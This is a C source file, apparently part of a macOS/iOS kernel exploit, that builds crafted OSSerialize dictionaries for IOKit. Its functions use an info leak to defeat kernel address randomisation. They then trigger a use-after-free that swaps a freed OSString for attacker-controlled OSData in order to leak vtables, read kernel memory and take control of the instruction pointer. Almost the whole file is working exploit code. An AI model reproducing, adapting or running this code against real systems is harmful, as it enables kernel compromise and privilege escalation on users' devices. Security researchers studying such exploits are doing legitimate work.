#include <errno.h>              // errno
#include <math.h>               // floor, log10
#include <stddef.h>             // size_t
#include <stdint.h>             // uint32_t, uint64_t
#include <stdlib.h>             // malloc
#include <string.h>             // strerror

#include <unistd.h>

#include <IOKit/IOKitLib.h>     // IO*, io_*

#include "common.h"             // DEBUG, ERROR
#include "io.h"                 // OSString, dict_get_property_bytes, dict_parse
#include "libexploit.h"

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,
};

size_t get_kernel_slide()
{
    DEBUG("Using info leak to get kernel slide...");

    size_t bufsize = 0x80;
    uint32_t buflen = (uint32_t)bufsize;
    const char key[4] = "lol";
    uint32_t dict[7] =
    {
        0x000000d3,                                                     // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries
        kOSSerializeSymbol | 4,                                         // Key symbol with 4 bytes
        *((uint32_t*)key),                                              // "lol", used later with IORegistryEntryGetProperty
        kOSSerializeEndCollection | kOSSerializeNumber | (8 * bufsize), // number of bits
        0x69696969,                                                     // Need sizeof(long long) bytes to pass checks
        0x69696969,
    };

    char *buf = malloc(bufsize);
    if(buf == NULL)
    {
        ERROR("Failed to allocate buffer (%s)", strerror(errno));
    }

    dict_get_property_bytes(dict, sizeof(dict), key, buf, &buflen);

    DEBUG("Kernel stack:");
    size_t *ubuf = (size_t*)buf;
    uint32_t max = buflen / sizeof(*ubuf),
             digits = (uint32_t)floor(log10(max - 1)) + 1;
    for(int i = 0; i < max; ++i)
    {
        DEBUG("ubuf[%*i]: " SIZE, digits, i, ubuf[i]);
    }

    // skip sizeof(long long), then read as size_t and subtract 0xffffff8004536000 (offset of symbol _ipc_kernel_map)
    size_t kslide = *(size_t*)( (char*)buf + sizeof(long long) ) - 0xffffff8004536000;
    DEBUG("kslide: " SIZE, kslide);

    free(buf);

    return kslide;
}

void uaf_get_vtab()
{
    DEBUG("Using UAF for mad haxx...");

    size_t bufsize = 0xf80;
    uint32_t buflen = (uint32_t)bufsize;
    const char str[4] = "str",
               ref[4] = "ref";
    uint32_t dict[11 + sizeof(OSData) / sizeof(uint32_t)] =
    {
        0x000000d3,                                                     // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries

        kOSSerializeString | (sizeof(OSData) - 1),                      // String that will get freed
        0x41414141,
        0x41414141,
        0x41414141,
        0x41414141,
        0x41414141,
        0x41414141,
#ifdef __LP64__
        0x41414141,
        0x41414141,
        0x41414141,
        0x41414141,
        0x41414141,
#endif
        0x00414141,
        kOSSerializeBoolean | 1,                                        // Whatever value to our key

        kOSSerializeSymbol | 4,                                         // A sane name for out reference
        *((uint32_t*)ref),
        kOSSerializeObject | 1,                                         // Reference to object 1 (OSString)

        kOSSerializeSymbol | 4,                                         // Whatever name for our OSData
        *((uint32_t*)str),
        kOSSerializeEndCollection | kOSSerializeData | 4,               // OSData that will overwrite the freed OSString's buffer
        0x00000000,
    };

    char *buf = malloc(bufsize);
    if(buf == NULL)
    {
        ERROR("Failed to allocate buffer (%s)", strerror(errno));
    }

    dict_get_property_bytes(dict, sizeof(dict), ref, buf, &buflen);

    DEBUG("Fetched bytes:");
    uint32_t *ubuf = (uint32_t*)buf;
    uint32_t max = buflen / sizeof(*ubuf),
             digits = (uint32_t)floor(log10(max - 1)) + 1;
    for(int i = 0; i < max; ++i)
    {
        DEBUG("ubuf[%*i]: 0x%08x", digits, i, ubuf[i]);
    }

    free(buf);
}

void uaf_get_bytes(const OSString *fake)
{
    DEBUG("Using UAF to read kernel bytes...");

    const uint32_t *data = (const uint32_t*)fake;
    for(int i = 0; i < 8; ++i)
    {
        DEBUG("data[%i]: 0x%08x", i, data[i]);
    }

    size_t bufsize = 0xf80;
    uint32_t buflen = (uint32_t)bufsize;
    const char str[4] = "str",
               ref[4] = "ref";
    uint32_t dict[8 + sizeof(OSString) / sizeof(uint32_t)] =
    {
        0x000000d3,                                                     // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries

        kOSSerializeString | 4,                                         // String that will get freed
        *((uint32_t*)ref),
        kOSSerializeObject | 1,                                         // Reference to object 1 (OSString)

        kOSSerializeSymbol | 4,                                         // Whatever, need a name for our OSData
        *((uint32_t*)str),
        kOSSerializeEndCollection | kOSSerializeData | sizeof(OSString),// OSData with same size as OSString
#ifdef __LP64__
        data[0],                                                        // vtable pointer (lower half)
        data[1],                                                        // vtable pointer (upper half)
        data[2],                                                        // retainCount
        data[3],                                                        // flags
        data[4],                                                        // length
        data[5],                                                        // (padding)
        data[6],                                                        // string pointer (lower half)
        data[7],                                                        // string pointer (upper half)
#else
        data[0],                                                        // vtable pointer
        data[1],                                                        // retainCount
        data[2],                                                        // flags
        data[3],                                                        // length
        data[4],                                                        // string pointer
#endif
    };

    char *buf = malloc(bufsize);
    if(buf == NULL)
    {
        ERROR("Failed to allocate buffer (%s)", strerror(errno));
    }

    dict_get_property_bytes(dict, sizeof(dict), ref, buf, &buflen);

    DEBUG("Fetched bytes:");
    uint32_t *ubuf = (uint32_t*)buf;
    uint32_t max = buflen / sizeof(*ubuf),
             digits = (uint32_t)floor(log10(max - 1)) + 1;
    for(int i = 0; i < max; ++i)
    {
        DEBUG("ubuf[%*i]: 0x%08x", digits, i, ubuf[i]);
    }

    free(buf);
}

void uaf_parse(const OSString *fake)
{
    DEBUG("Using UAF to get RIP control...");

    const uint32_t *data = (const uint32_t*)fake;
    for(int i = 0; i < 8; ++i)
    {
        DEBUG("data[%i]: 0x%08x", i, data[i]);
    }

    const char str[4] = "str",
               ref[4] = "ref";
#if 0
    uint32_t dict[11 + sizeof(OSString)] =
    {
        0x000000d3,                                                 // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 6,     // Dictionary with 6 entries

        kOSSerializeString | 4,                                     // String that will get freed
        *((uint32_t*)str),
        kOSSerializeBoolean | 1,                                    // Whatever, just need a value to our key

        kOSSerializeSymbol | 4,                                     // Whatever, need a name for our OSData
        *((uint32_t*)dat),
        kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
#ifdef __LP64__
        data[0],                                                    // vtable pointer (lower half)
        data[1],                                                    // vtable pointer (upper half)
        data[2],                                                    // retainCount
        data[3],                                                    // flags
        data[4],                                                    // length
        data[5],                                                    // (padding)
        data[6],                                                    // string pointer (lower half)
        data[7],                                                    // string pointer (upper half)
#else
        data[0],                                                    // vtable pointer
        data[1],                                                    // retainCount
        data[2],                                                    // flags
        data[3],                                                    // length
        data[4],                                                    // string pointer
#endif

        kOSSerializeSymbol | 4,                                     // Whatever name for our reference
        *((uint32_t*)ref),
        kOSSerializeEndCollection | kOSSerializeObject | 1,         // Reference to object 1 (OSString)
    };
#endif
    uint32_t dict[8 + sizeof(OSString) / sizeof(uint32_t)] =
    {
        0x000000d3,                                                 // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 4,     // Dictionary with 4 entries

        kOSSerializeString | 4,                                     // String that will get freed
        *((uint32_t*)str),
        kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
#ifdef __LP64__
        data[0],                                                    // vtable pointer (lower half)
        data[1],                                                    // vtable pointer (upper half)
        data[2],                                                    // retainCount
        data[3],                                                    // flags
        data[4],                                                    // length
        data[5],                                                    // (padding)
        data[6],                                                    // string pointer (lower half)
        data[7],                                                    // string pointer (upper half)
#else
        data[0],                                                    // vtable pointer
        data[1],                                                    // retainCount
        data[2],                                                    // flags
        data[3],                                                    // length
        data[4],                                                    // string pointer
#endif

        kOSSerializeSymbol | 4,                                     // Whatever name for our reference
        *((uint32_t*)ref),
        kOSSerializeEndCollection | kOSSerializeObject | 1,         // Reference to object 1 (OSString)
    };

    sleep(1); /* TODO: DEBUG */

    dict_parse(dict, sizeof(dict));
}
